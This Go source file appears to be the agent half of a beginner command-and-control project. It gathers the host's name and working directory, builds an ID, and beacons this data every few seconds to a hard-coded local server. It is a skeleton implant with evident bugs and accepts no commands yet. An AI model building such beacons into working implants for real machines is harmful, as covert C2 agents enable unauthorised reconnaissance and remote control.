package main

import (
	"c2-devstorm/commons"
	"crypto/md5"
	"encoding/gob"
	"encoding/hex"
	"log"
	"net"
	"os"
	"time"
)

var (
	message  commons.Message
	timeLeft = 5
)

const (
	SERVER = "127.0.0.1"
	PORT   = "9091"
)

func init() {
	message.AgentHostname, _ = os.Hostname()
	message.AgentCWS, _ = os.Getwd()
	message.AgentID = geraID()
}

func main() {
	log.Println("Entrei em Execução!!!")
	for {
		channel := connectToServer()
		defer channel.Close()
		gob.NewEncoder(channel).Encode(message)
		gob.NewDecoder(channel).Decode(message)

		time.Sleep(time.Duration(timeLeft) * time.Second)
	}

	//log.Println("Meu ID é: ", geraID())
}
func connectToServer() (channel net.Conn) {
	channel, _ = net.Dial("tcp", SERVER+":"+PORT)
	return channel
}

func geraID() string {
	myTime := time.Now().String()

	hasher := md5.New()
	hasher.Write([]byte(message.AgentHostname + myTime))

	return hex.EncodeToString(hasher.Sum(nil))
}
